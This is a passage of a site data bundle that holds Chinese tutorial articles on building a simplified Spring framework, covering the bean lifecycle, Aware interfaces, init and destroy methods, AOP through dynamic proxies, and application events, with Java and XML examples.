}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 感知对象\n\n感知对象做为一个扩展接口，只要我们的 bean 实现了这些接口，就可以为我们的 bean 提供额外的能力\n\n    private object initializebean(string beanname, object bean, beandefinition beandefinition) {\n        // invokeawaremethods（感知对象）\n        if (bean instanceof aware) {\n            if (bean instanceof beanfactoryaware) {\n                ((beanfactoryaware) bean).setbeanfactory(this);\n            }\n            if (bean instanceof beanclassloaderaware) {\n                ((beanclassloaderaware) bean).setbeanclassloader(getbeanclassloader());\n            }\n            if (bean instanceof beannameaware) {\n                ((beannameaware) bean).setbeanname(beanname);\n            }\n        }\n        // 1. 执行 beanpostprocessor before 处理\n        object wrappedbean = applybeanpostprocessorsbeforeinitialization(bean, beanname);\n        // 执行 bean 对象的初始化方法\n        try {\n            invokeinitmethods(beanname, wrappedbean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("invocation of init method of bean[" + beanname + "] failed", e);\n        }\n        // 2. 执行 beanpostprocessor after 处理\n        wrappedbean = applybeanpostprocessorsafterinitialization(wrappedbean, beanname);\n        return wrappedbean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 初始化方法之前\n\n在 bean 的初始化方法之前调用，默认提供了 applicationcontext 的上下文注入，当某个类实现了 applicationcontextaware，就提供 applicationcontext 上下文的能力，只是我们要实现的是 applicationcontextaware ，并不是 beanpostprocessor\n\n    @override\n    public object applybeanpostprocessorsbeforeinitialization(object existingbean, string beanname) throws beansexception {\n        object result = existingbean;\n        for (beanpostprocessor processor : getbeanpostprocessors()) {\n            object current = processor.postprocessbeforeinitialization(result, beanname);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) throws beansexception {\n        if (bean instanceof applicationcontextaware){\n            ((applicationcontextaware) bean).setapplicationcontext(applicationcontext);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# bean 的初始化方法\n\nbean 初始化方法还是比较简单的，主要是通过判断是否实现 initializingbean 接口，如果实现了，则调用实例化对象实现的 afterpropertiesset 方法。如果不是以接口实现的，是以 xml 描述的，则是通过反射的方式调用该方法。\n\n    private void invokeinitmethods(string beanname, object bean, beandefinition beandefinition) throws exception {\n        // 1. 实现接口 initializingbean\n        if (bean instanceof initializingbean) {\n            ((initializingbean) bean).afterpropertiesset();\n        }\n\n        // 2. 注解配置 init-method {判断是为了避免二次执行销毁}\n        string initmethodname = beandefinition.getinitmethodname();\n        if (strutil.isnotempty(initmethodname)) {\n            method initmethod = beandefinition.getbeanclass().getmethod(initmethodname);\n            if (null == initmethod) {\n                throw new beansexception("could not find an init method named \'" + initmethodname + "\' on bean with name \'" + beanname + "\'");\n            }\n            initmethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n<bean id="userdao" class="cn.bugstack.springframework.test.bean.userdao" init-method="initdatamethod" destroy-method="destroydatamethod"/>\n\n\n1\n\n\n\n# 初始化方法之后\n\n    @override\n    public object applybeanpostprocessorsafterinitialization(object existingbean, string beanname) throws beansexception {\n        object result = existingbean;\n        for (beanpostprocessor processor : getbeanpostprocessors()) {\n            object current = processor.postprocessafterinitialization(result, beanname);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 注册销毁事件\n\n销毁事件需要 bean 实现 disposablebean 接口并重写 destroy () 方法。如下先是把实现 disposablebean 或有在 xml 描述过销毁方法的注册到一个容器里。\n\n    protected void registerdisposablebeanifnecessary(string beanname, object bean, beandefinition beandefinition) {\n        // 非 singleton 类型的 bean 不执行销毁方法\n        if (!beandefinition.issingleton()) return;\n        if (bean instanceof disposablebean || strutil.isnotempty(beandefinition.getdestroymethodname())) {\n            registerdisposablebean(beanname, new disposablebeanadapter(bean, beanname, beandefinition));\n        }\n    }\n\n    public void registerdisposablebean(string beanname, disposablebean bean) {\n        disposablebeans.put(beanname, bean);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n然后再整个启动过程结束调用 registershutdownhook 方法添加一个钩子监听。\n\n    @override\n    public void registershutdownhook() {\n        // java 中的一个方法，它用于注册 jvm 关闭时要执行的特定代码块。当 jvm 即将关闭时，这些代码块会被执行，以便进行清理、释放资源等操作。\n        // 这些代码块通常称为“钩子（hook）”，因此该方法也被称为“添加关闭钩子（add shutdown hook）”。\n        runtime.getruntime().addshutdownhook(new thread(this::close));\n    }\n\n    @override\n    public void close() {\n        // 发布容器关闭事件\n        publishevent(new contextclosedevent(this));\n        // 执行销毁单例bean的销毁方法\n        getbeanfactory().destroysingletons();\n    }\n\n    public void destroysingletons() {\n        set<string> keyset = this.disposablebeans.keyset();\n        object[] disposablebeannames = keyset.toarray();\n\n        for (int i = disposablebeannames.length - 1; i >= 0; i--) {\n            object beanname = disposablebeannames[i];\n            disposablebean disposablebean = disposablebeans.remove(beanname);\n            try {\n                disposablebean.destroy();\n            } catch (exception e) {\n                throw new beansexception("destroy method on bean with name \'" + beanname + "\' threw an exception", e);\n            }\n        }\n    }\n\n    @override\n    public void destroy() throws exception {\n        // 1. 实现接口 disposablebean\n        if (bean instanceof disposablebean) {\n            ((disposablebean) bean).destroy();\n        }\n        // 2. 注解配置 destroy-method {判断是为了避免二次执行销毁}\n        if (strutil.isnotempty(destroymethodname) && !(bean instanceof disposablebean && "destroy".equals(this.destroymethodname))) {\n            method destroymethod = bean.getclass().getmethod(destroymethodname);\n            if (null == destroymethod) {\n                throw new beansexception("couldn\'t find a destroy method named \'" + destroymethodname + "\' on bean with name \'" + beanname + "\'");\n            }\n            destroymethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# scop 处理单例\n\n    public void registersingleton(string beanname, object singletonobject) {\n        // 三级缓存\n        singletonobjects.put(beanname, singletonobject);\n        // 二级缓存\n        earlysingletonobjects.remove(beanname);\n        // 一级缓存\n        singletonfactories.remove(beanname);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',charsets:{cjk:!0}},{title:"核心内容拆解 AOP",frontmatter:{title:"核心内容拆解 AOP",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/201/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/201.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20AOP.html",relativePath:"00.java/20.Spring/21.spring/201.核心内容拆解 AOP.md",key:"v-1a1b5d5b",path:"/spring/spring/201/",headers:[{level:2,title:"AOP",slug:"aop",normalizedTitle:"aop",charIndex:2},{level:3,title:"封装",slug:"封装",normalizedTitle:"封装",charIndex:2882},{level:3,title:"把封装的融入到 Spring 中",slug:"把封装的融入到-spring-中",normalizedTitle:"把封装的融入到 spring 中",charIndex:5234}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"AOP 封装 把封装的融入到 Spring 中",content:'# AOP\n\nAOP 的诞生可以追溯到上世纪 90 年代初期，它最早由 Gregor Kiczales 等人提出，并在 1997 年发表了经典的论文 Aspect-Oriented Programming。后来，AspectJ 成为了 Java 生态中使用最广泛的 AOP 框架之一。\n\nAOP 的目的是为了解决在 OOP（面向对象编程）中难以处理的横切关注点问题，即将系统业务逻辑代码与其他非业务功能（如日志记录、性能统计、安全控制等）分离开来。AOP 通过把这些非业务功能独立出来，在需要时动态地植入到系统中，从而实现对业务逻辑的无侵入式增强。\n\nAOP 的核心在于其能够将业务逻辑与非业务功能分离开来，从而降低了代码的耦合度，并且支持在运行时动态地植入和移除切面。这样一来，就可以实现更加灵活、可维护和可扩展的系统。\n\nAOP 的具体表现包括切面（Aspect）、连接点（Join Point）、通知（Advice）、切点（Pointcut）和引入（Introduction）等概念。其中，切面是指横跨多个对象的通用功能，连接点是程序执行过程中能够插入切面的点，通知则是定义了切面在连接点处所执行的操作，切点则是一个谓词表达式，用于匹配连接点，引入则是为某个对象添加新的接口实现。具体如下代码：\n\n    public void test_proxy_method() {\n        // 目标对象(可以替换成任何的目标对象)\n        Object targetObj = new UserService();\n        // AOP 代理\n        IUserService proxy = (IUserService) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), targetObj.getClass().getInterfaces(), new InvocationHandler() {\n            // 方法匹配器\n            MethodMatcher methodMatcher = new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))");\n            @Override\n            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                if (methodMatcher.matches(method, targetObj.getClass())) {\n                    // 方法拦截器\n                    MethodInterceptor methodInterceptor = invocation -> {\n                        long start = System.currentTimeMillis();\n                        try {\n                            return invocation.proceed();\n                        } finally {\n                            System.out.println("监控 - Begin By AOP");\n                            System.out.println("方法名称：" + invocation.getMethod().getName());\n                            System.out.println("方法耗时：" + (System.currentTimeMillis() - start) + "ms");\n                            System.out.println("监控 - End\\r\\n");\n                        }\n                    };\n                    // 反射调用\n                    return methodInterceptor.invoke(new ReflectiveMethodInvocation(targetObj, method, args));\n                }\n                return method.invoke(targetObj, args);\n            }\n        });\n        String result = proxy.queryUserInfo();\n        System.out.println("测试结果：" + result);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n这段代码使用了 JDK 动态代理实现 AOP 的功能，没有使用 Spring 提供的方法、类和注解等。\n\n * 连接点：连接点是在目标对象上匹配的特定点，这里的连接点是 IUserService 接口中的所有方法，由于使用了 targetObj.getClass ().getInterfaces () 获取目标对象所实现的接口，因此只拦截了 IUserService 接口中的方法。\n * 切面：切面是一个模块化的横切关注点，在这里我们可以视为没有显式定义的切面。而是直接在 InvocationHandler.invoke () 中实现了拦截和增强逻辑，包括方法匹配器、方法拦截器和反射调用等。\n * 切点：切点是一种谓词表达式，用于匹配连接点。这里使用了 AspectJ 表达式 "execution (* cn.bugstack.springframework.test.bean.IUserService.*(..))"，它匹配了 IUserService 接口中的所有方法。\n * 通知：通知类型包括前置通知、后置通知、环绕通知、抛出通知和最终通知。在这里使用了环绕通知，即在方法执行之前和之后添加了监控逻辑。\n * 引入：引介通常是一个特殊的通知类型，它允许在运行时为类动态地添加新接口实现。这里没有使用引介。\n\n\n# 封装\n\n在 Spring 中，核心逻辑是离不开上面的代理例子的，只是相对应做了些封装，我们先用类图来简单说明下封装关系：\n\n\n\n用测试例子来说明每步的核心\n\n    /**\n     * 切点表达式，来验证切点\n     * @throws NoSuchMethodException\n     */\n    @Test\n    public void test_aop() throws NoSuchMethodException {\n        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.UserService.*(..))");\n        Class<UserService> clazz = UserService.class;\n        Method method = clazz.getDeclaredMethod("queryUserInfo");\n        System.out.println("切点是否包含该类：" + pointcut.matches(clazz));\n        System.out.println("切点是否包含该类该方法：" + pointcut.matches(method, clazz));\n    }\n\n    /**\n     * 切面 和 动态代理\n     */\n    @Test\n    public void test_dynamic() {\n        // 目标对象\n        IUserService userService = new UserService();\n        // 组装代理信息，切面\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        // 设置代理目标对象\n        advisedSupport.setTargetSource(new TargetSource(userService));\n        // 设置拦截器\n        advisedSupport.setMethodInterceptor(new UserServiceInterceptor());\n        // 匹配代理对象\n        advisedSupport.setMethodMatcher(new AspectJExpressionPointcut("execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))"));\n        // 代理对象(JdkDynamicAopProxy)\n        IUserService proxy_jdk = (IUserService) new JdkDynamicAopProxy(advisedSupport).getProxy();\n        // 测试调用\n        System.out.println("测试结果：" + proxy_jdk.queryUserInfo());\n        // 代理对象(Cglib2AopProxy)\n        IUserService proxy_cglib = (IUserService) new Cglib2AopProxy(advisedSupport).getProxy();\n        // 测试调用\n        System.out.println("测试结果：" + proxy_cglib.register("花花"));\n    }\n\npublic class UserServiceInterceptor implements MethodInterceptor {\n    @Override\n    public Object invoke(MethodInvocation invocation) throws Throwable {\n        long start = System.currentTimeMillis();\n        try {\n            return invocation.proceed();\n        } finally {\n            System.out.println("监控 - Begin By AOP");\n            System.out.println("方法名称：" + invocation.getMethod());\n            System.out.println("方法耗时：" + (System.currentTimeMillis() - start) + "ms");\n            System.out.println("监控 - End\\r\\n");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# 把封装的融入到 Spring 中\n\n右侧部分就是描述了整个融合到 Spring 中的类，会在 Bean 创建的过程中 初始化方法之后 这个生命周期内先找到是否提供了 DefaultAdvisorAutoProxyCreator 类的支持，因为他描述了具体代理类的过程。\n\n> 为什么会在初始化方法之后才进行代理，是因为代理类也需要的属性也需要被填充，所以等填充完毕后在代理\n\n\n\n核心方法，描述了整个类被代理的过程\n\n    protected Object wrapIfNecessary(Object bean, String beanName) {\n        // 判断Bean是否是Advice，Pointcut，Advisor的子类或者两类相同可以相互转（类层面），用户定义的类都是 false\n        if (isInfrastructureClass(bean.getClass())) return bean;\n        // 得到注册的AspectJExpressionPointcutAdvisor\n        Collection<AspectJExpressionPointcutAdvisor> advisors = beanFactory.getBeansOfType(AspectJExpressionPointcutAdvisor.class).values();\n        for (AspectJExpressionPointcutAdvisor advisor : advisors) {\n            ClassFilter classFilter = advisor.getPointcut().getClassFilter();\n            // 用表达式 过滤匹配类\n            if (!classFilter.matches(bean.getClass())) continue;\n            // 封装\n            AdvisedSupport advisedSupport = new AdvisedSupport();\n            TargetSource targetSource = new TargetSource(bean);\n            advisedSupport.setTargetSource(targetSource);\n            advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice());\n            advisedSupport.setMethodMatcher(advisor.getPointcut().getMethodMatcher());\n            advisedSupport.setProxyTargetClass(true);\n            // 返回代理对象\n            return new ProxyFactory(advisedSupport).getProxy();\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<beans>\n    \x3c!-- 目标类 --\x3e\n    <bean id="userService" class="cn.bugstack.springframework.test.bean.UserService"/>\n    \x3c!-- 代理类 --\x3e\n    <bean id="beforeAdvice" class="cn.bugstack.springframework.test.bean.UserServiceBeforeAdvice"/>\n    \x3c!-- 组件类，至关重要 --\x3e\n    <bean class="cn.bugstack.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"/>\n    \x3c!-- \n        这里是  advisedSupport.setMethodInterceptor((MethodInterceptor) advisor.getAdvice()); 设置拦截器，\n        可以是前置拦截，后置拦截，或者环绕拦截\n     --\x3e\n    <bean id="methodInterceptor" class="cn.bugstack.springframework.aop.framework.adapter.MethodBeforeAdviceInterceptor">\n        <property name="advice" ref="beforeAdvice"/>\n    </bean>\n    \x3c!-- 切面表达式 --\x3e\n    <bean id="pointcutAdvisor" class="cn.bugstack.springframework.aop.aspectj.AspectJExpressionPointcutAdvisor">\n        <property name="expression" value="execution(* cn.bugstack.springframework.test.bean.IUserService.*(..))"/>\n        <property name="advice" ref="methodInterceptor"/>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# aop\n\naop 的诞生可以追溯到上世纪 90 年代初期，它最早由 gregor kiczales 等人提出，并在 1997 年发表了经典的论文 aspect-oriented programming。后来，aspectj 成为了 java 生态中使用最广泛的 aop 框架之一。\n\naop 的目的是为了解决在 oop（面向对象编程）中难以处理的横切关注点问题，即将系统业务逻辑代码与其他非业务功能（如日志记录、性能统计、安全控制等）分离开来。aop 通过把这些非业务功能独立出来，在需要时动态地植入到系统中，从而实现对业务逻辑的无侵入式增强。\n\naop 的核心在于其能够将业务逻辑与非业务功能分离开来，从而降低了代码的耦合度，并且支持在运行时动态地植入和移除切面。这样一来，就可以实现更加灵活、可维护和可扩展的系统。\n\naop 的具体表现包括切面（aspect）、连接点（join point）、通知（advice）、切点（pointcut）和引入（introduction）等概念。其中，切面是指横跨多个对象的通用功能，连接点是程序执行过程中能够插入切面的点，通知则是定义了切面在连接点处所执行的操作，切点则是一个谓词表达式，用于匹配连接点，引入则是为某个对象添加新的接口实现。具体如下代码：\n\n    public void test_proxy_method() {\n        // 目标对象(可以替换成任何的目标对象)\n        object targetobj = new userservice();\n        // aop 代理\n        iuserservice proxy = (iuserservice) proxy.newproxyinstance(thread.currentthread().getcontextclassloader(), targetobj.getclass().getinterfaces(), new invocationhandler() {\n            // 方法匹配器\n            methodmatcher methodmatcher = new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))");\n            @override\n            public object invoke(object proxy, method method, object[] args) throws throwable {\n                if (methodmatcher.matches(method, targetobj.getclass())) {\n                    // 方法拦截器\n                    methodinterceptor methodinterceptor = invocation -> {\n                        long start = system.currenttimemillis();\n                        try {\n                            return invocation.proceed();\n                        } finally {\n                            system.out.println("监控 - begin by aop");\n                            system.out.println("方法名称：" + invocation.getmethod().getname());\n                            system.out.println("方法耗时：" + (system.currenttimemillis() - start) + "ms");\n                            system.out.println("监控 - end\\r\\n");\n                        }\n                    };\n                    // 反射调用\n                    return methodinterceptor.invoke(new reflectivemethodinvocation(targetobj, method, args));\n                }\n                return method.invoke(targetobj, args);\n            }\n        });\n        string result = proxy.queryuserinfo();\n        system.out.println("测试结果：" + result);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n这段代码使用了 jdk 动态代理实现 aop 的功能，没有使用 spring 提供的方法、类和注解等。\n\n * 连接点：连接点是在目标对象上匹配的特定点，这里的连接点是 iuserservice 接口中的所有方法，由于使用了 targetobj.getclass ().getinterfaces () 获取目标对象所实现的接口，因此只拦截了 iuserservice 接口中的方法。\n * 切面：切面是一个模块化的横切关注点，在这里我们可以视为没有显式定义的切面。而是直接在 invocationhandler.invoke () 中实现了拦截和增强逻辑，包括方法匹配器、方法拦截器和反射调用等。\n * 切点：切点是一种谓词表达式，用于匹配连接点。这里使用了 aspectj 表达式 "execution (* cn.bugstack.springframework.test.bean.iuserservice.*(..))"，它匹配了 iuserservice 接口中的所有方法。\n * 通知：通知类型包括前置通知、后置通知、环绕通知、抛出通知和最终通知。在这里使用了环绕通知，即在方法执行之前和之后添加了监控逻辑。\n * 引入：引介通常是一个特殊的通知类型，它允许在运行时为类动态地添加新接口实现。这里没有使用引介。\n\n\n# 封装\n\n在 spring 中，核心逻辑是离不开上面的代理例子的，只是相对应做了些封装，我们先用类图来简单说明下封装关系：\n\n\n\n用测试例子来说明每步的核心\n\n    /**\n     * 切点表达式，来验证切点\n     * @throws nosuchmethodexception\n     */\n    @test\n    public void test_aop() throws nosuchmethodexception {\n        aspectjexpressionpointcut pointcut = new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.userservice.*(..))");\n        class<userservice> clazz = userservice.class;\n        method method = clazz.getdeclaredmethod("queryuserinfo");\n        system.out.println("切点是否包含该类：" + pointcut.matches(clazz));\n        system.out.println("切点是否包含该类该方法：" + pointcut.matches(method, clazz));\n    }\n\n    /**\n     * 切面 和 动态代理\n     */\n    @test\n    public void test_dynamic() {\n        // 目标对象\n        iuserservice userservice = new userservice();\n        // 组装代理信息，切面\n        advisedsupport advisedsupport = new advisedsupport();\n        // 设置代理目标对象\n        advisedsupport.settargetsource(new targetsource(userservice));\n        // 设置拦截器\n        advisedsupport.setmethodinterceptor(new userserviceinterceptor());\n        // 匹配代理对象\n        advisedsupport.setmethodmatcher(new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))"));\n        // 代理对象(jdkdynamicaopproxy)\n        iuserservice proxy_jdk = (iuserservice) new jdkdynamicaopproxy(advisedsupport).getproxy();\n        // 测试调用\n        system.out.println("测试结果：" + proxy_jdk.queryuserinfo());\n        // 代理对象(cglib2aopproxy)\n        iuserservice proxy_cglib = (iuserservice) new cglib2aopproxy(advisedsupport).getproxy();\n        // 测试调用\n        system.out.println("测试结果：" + proxy_cglib.register("花花"));\n    }\n\npublic class userserviceinterceptor implements methodinterceptor {\n    @override\n    public object invoke(methodinvocation invocation) throws throwable {\n        long start = system.currenttimemillis();\n        try {\n            return invocation.proceed();\n        } finally {\n            system.out.println("监控 - begin by aop");\n            system.out.println("方法名称：" + invocation.getmethod());\n            system.out.println("方法耗时：" + (system.currenttimemillis() - start) + "ms");\n            system.out.println("监控 - end\\r\\n");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# 把封装的融入到 spring 中\n\n右侧部分就是描述了整个融合到 spring 中的类，会在 bean 创建的过程中 初始化方法之后 这个生命周期内先找到是否提供了 defaultadvisorautoproxycreator 类的支持，因为他描述了具体代理类的过程。\n\n> 为什么会在初始化方法之后才进行代理，是因为代理类也需要的属性也需要被填充，所以等填充完毕后在代理\n\n\n\n核心方法，描述了整个类被代理的过程\n\n    protected object wrapifnecessary(object bean, string beanname) {\n        // 判断bean是否是advice，pointcut，advisor的子类或者两类相同可以相互转（类层面），用户定义的类都是 false\n        if (isinfrastructureclass(bean.getclass())) return bean;\n        // 得到注册的aspectjexpressionpointcutadvisor\n        collection<aspectjexpressionpointcutadvisor> advisors = beanfactory.getbeansoftype(aspectjexpressionpointcutadvisor.class).values();\n        for (aspectjexpressionpointcutadvisor advisor : advisors) {\n            classfilter classfilter = advisor.getpointcut().getclassfilter();\n            // 用表达式 过滤匹配类\n            if (!classfilter.matches(bean.getclass())) continue;\n            // 封装\n            advisedsupport advisedsupport = new advisedsupport();\n            targetsource targetsource = new targetsource(bean);\n            advisedsupport.settargetsource(targetsource);\n            advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice());\n            advisedsupport.setmethodmatcher(advisor.getpointcut().getmethodmatcher());\n            advisedsupport.setproxytargetclass(true);\n            // 返回代理对象\n            return new proxyfactory(advisedsupport).getproxy();\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<beans>\n    \x3c!-- 目标类 --\x3e\n    <bean id="userservice" class="cn.bugstack.springframework.test.bean.userservice"/>\n    \x3c!-- 代理类 --\x3e\n    <bean id="beforeadvice" class="cn.bugstack.springframework.test.bean.userservicebeforeadvice"/>\n    \x3c!-- 组件类，至关重要 --\x3e\n    <bean class="cn.bugstack.springframework.aop.framework.autoproxy.defaultadvisorautoproxycreator"/>\n    \x3c!-- \n        这里是  advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice()); 设置拦截器，\n        可以是前置拦截，后置拦截，或者环绕拦截\n     --\x3e\n    <bean id="methodinterceptor" class="cn.bugstack.springframework.aop.framework.adapter.methodbeforeadviceinterceptor">\n        <property name="advice" ref="beforeadvice"/>\n    </bean>\n    \x3c!-- 切面表达式 --\x3e\n    <bean id="pointcutadvisor" class="cn.bugstack.springframework.aop.aspectj.aspectjexpressionpointcutadvisor">\n        <property name="expression" value="execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))"/>\n        <property name="advice" ref="methodinterceptor"/>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"核心内容拆解 事件通知",frontmatter:{title:"核心内容拆解 事件通知",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/202/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/202.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20%E4%BA%8B%E4%BB%B6%E9%80%9A%E7%9F%A5.html",relativePath:"00.java/20.Spring/21.spring/202.核心内容拆解 事件通知.md",key:"v-c10cfd86",path:"/spring/spring/202/",lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:null,content:'在 Spring 框架中，Event 代表着一个应用程序中的事件。这些事件可以是任何类型的状态变化，如用户操作、数据更新和系统错误等等。我们可以使用 Event 来实现应用程序内部的通信和协作。通过观察者模式，我们可以让不同的组件在特定的事件发生时做出响应，从而实现松耦合的设计。\n\nSpring 提供了一个简单而强大的机制来处理 Event，即 ApplicationEvent 和 ApplicationListener 接口。ApplicationEvent 是一个基本的事件类，它可以被继承以实现各种类型的事件。ApplicationListener 接口则定义了一个监听器，在某个事件发生时触发回调方法。以下提供了基本的类图关系，其中 AbstractApplicationContext 是执行 Spring 所有核心方法的集成类：\n\n\n\nSpring 提供了许多不同类型的 Event，每种 Event 都有其特定的作用和用途。下面是 Spring 生命周期中提供的 Event 及其作用：\n\n * ContextRefreshedEvent：表示 ApplicationContext 已经初始化并且准备好接受请求。通常情况下，我们可以利用该事件来进行一些初始化操作。\n * ContextStartedEvent：表示 ApplicationContext 正在启动。当应用程序中有需要在启动时执行的操作时，可以使用该事件进行处理。\n * ContextStoppedEvent：表示 ApplicationContext 已停止。当需要在应用程序停止前执行某些操作时，可以使用该事件。\n * ContextClosedEvent：表示 ApplicationContext 已经关闭。与 ContextStoppedEvent 不同，ContextClosedEvent 是在 ApplicationContext 关闭之后发送的，它允许我们对资源进行完全释放。\n * RequestHandledEvent：表示一个 HTTP 请求已经被处理完毕。该事件通常用于记录或统计请求处理的性能数据。\n\n在 Spring 中，我们可以通过实现 ApplicationListener 接口或使用 @EventListener 注解来监听这些事件。以监听 ContextRefreshedEvent 为例，我们可以编写如下代码：\n\n@Component\npublic class MyListener implements ApplicationListener<ContextRefreshedEvent> {\n    @Override\n    public void onApplicationEvent(ContextRefreshedEvent event) {\n        // 在此处编写需要执行的逻辑\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n除了实现 ApplicationListener 接口外，我们还可以使用 @EventListener 注解来监听事件。例如，我们可以在 Spring 组件中添加如下方法：\n\n@EventListener\npublic void handleContextRefreshedEvent(ContextRefreshedEvent event) {\n    // 在此处编写需要执行的逻辑\n}\n\n\n1\n2\n3\n4\n\n\n要使用 Spring 提供的类自定义一个事件发布和监听，首先，我们需要定义一个自定义事件。可以创建一个继承自 ApplicationEvent 的类，并在其中添加自定义字段和方法\n\npublic class MyCustomEvent extends ApplicationEvent {\n    private String message;\n    public MyCustomEvent(Object source, String message) {\n        super(source);\n        this.message = message;\n    }\n    public String getMessage() {\n        return message;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n发布事件 一旦定义了自定义事件，我们就可以使用 ApplicationContext 的 publishEvent 方法来发布事件\n\n@Autowired\nprivate ApplicationContext applicationContext;\n\npublic void doSomethingAndPublishEvent() {\n    // 在此处执行业务逻辑\n    MyCustomEvent event = new MyCustomEvent(this, "Hello, world!");\n    applicationContext.publishEvent(event);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n监听事件 最后，我们需要创建一个事件监听器，以便处理自定义事件。可以创建一个实现 ApplicationListener 接口的类，并在其 onApplicationEvent 方法中添加处理逻辑\n\n@Component\npublic class MyCustomEventListener implements ApplicationListener<MyCustomEvent> {\n    @Override\n    public void onApplicationEvent(MyCustomEvent event) {\n        System.out.println("Received custom event - " + event.getMessage());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n这样，当 MyCustomEvent 事件被发布时，MyCustomEventListener 就会收到该事件并调用其 onApplicationEvent 方法进行处理。',normalizedContent:'在 spring 框架中，event 代表着一个应用程序中的事件。这些事件可以是任何类型的状态变化，如用户操作、数据更新和系统错误等等。我们可以使用 event 来实现应用程序内部的通信和协作。通过观察者模式，我们可以让不同的组件在特定的事件发生时做出响应，从而实现松耦合的设计。\n\nspring 提供了一个简单而强大的机制来处理 event，即 applicationevent 和 applicationlistener 接口。applicationevent 是一个基本的事件类，它可以被继承以实现各种类型的事件。applicationlistener 接口则定义了一个监听器，在某个事件发生时触发回调方法。以下提供了基本的类图关系，其中 abstractapplicationcontext 是执行 spring 所有核心方法的集成类：\n\n\n\nspring 提供了许多不同类型的 event，每种 event 都有其特定的作用和用途。下面是 spring 生命周期中提供的 event 及其作用：\n\n * contextrefreshedevent：表示 applicationcontext 